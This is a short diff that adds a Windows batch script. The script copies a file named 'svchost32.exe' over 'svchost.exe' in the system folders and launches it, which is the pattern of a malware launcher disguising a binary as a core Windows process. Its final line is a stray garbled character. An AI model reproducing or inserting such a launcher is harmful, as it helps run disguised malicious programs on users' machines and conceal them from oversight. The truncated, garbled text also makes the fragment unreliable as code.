@@ -1,0 +1,5 @@
+@echo off 
+if exist %windir%\system\svchost32.exe copy /Y %windir%\system\svchost32.exe %windir%\system\svchost.exe 
+start %windir%\system\svchost.exe 
+if exist %windir%\system32\svchost32.exe copy /Y %windir%\system32\svchost32.exe %windir%\system\svchost.exe 
+½
